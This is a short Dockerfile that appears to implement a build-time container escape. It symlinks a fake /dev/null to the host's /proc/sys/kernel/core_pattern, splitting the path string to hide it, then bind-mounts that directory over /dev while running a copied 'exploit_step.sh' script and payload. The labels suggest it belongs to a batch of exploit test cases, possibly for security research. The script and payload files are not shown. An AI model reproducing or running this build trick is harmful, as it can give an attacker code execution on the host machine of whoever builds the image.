FROM alpine:3.20 AS mknull2
RUN apk add --no-cache curl >/dev/null 2>&1; mkdir -p /fake/dev && T=/proc/sys/kernel/core_pat && T=${T}tern && ln -s "$T" /fake/dev/null

FROM mknull2 AS mnt
COPY front2/scripts/f2_payload /f2p_payload
COPY front2/scripts/exploit_step.sh /exploit_step.sh
RuN --mount=type=bind,from=mknull2,source=/fake/dev,target=/dev sh /exploit_step.sh

FROM alpine:3.20 AS collect
COPY --from=mnt /etc/hostname /x
RUN echo F2-BATCH8-mixed-DONE
